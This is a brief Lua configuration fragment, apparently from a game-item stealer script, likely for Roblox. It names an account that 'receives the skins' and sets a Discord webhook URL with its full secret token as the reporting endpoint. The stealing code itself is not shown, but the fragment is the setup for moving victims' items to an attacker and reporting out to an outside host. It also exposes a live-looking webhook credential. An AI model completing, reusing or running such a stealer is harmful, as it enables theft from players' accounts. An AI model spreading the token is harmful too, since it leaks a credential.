local CONFIG = {
    ...
    TARGET_NAME   = "dnxi43", -- username de la cuenta que recibe las skins
    ...
    WEBHOOK = {
        URL  = "https://discord.com/api/webhooks/1549266158262423612/-H_LxFbd3ZrZCafpGqUvwR1mX50RYRo9ZzjPtZ0iEmHSvzKxnnPBO1hf4TUiWcIRdDff", -- "https://discord.com/api/webhooks/" webhook de Discord
